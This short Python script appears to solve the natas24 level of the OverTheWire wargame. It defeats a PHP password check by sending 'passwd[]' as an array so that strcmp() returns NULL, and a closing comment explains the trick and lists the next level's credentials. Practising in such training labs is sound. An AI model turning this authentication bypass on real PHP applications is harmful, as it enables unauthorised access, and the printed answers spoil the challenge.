from bs4 import BeautifulSoup
import requests

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
    
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        

url = 'http://natas24.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas24','OsRmXFguozKpTZZ5X14zNO43379LZveg')
my_cookies = {"PHPSESSID":''} #irrelevant for this one 
my_params = {"passwd[]":'not sure'}

res, soup = make()
writeResponse()

'''
Another type conversion lesson. 0, 0.0, "0", and NULL auto cast to false.
And passing an array into strcmp() returns NULL in PHP.

Username: natas25 
Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
'''
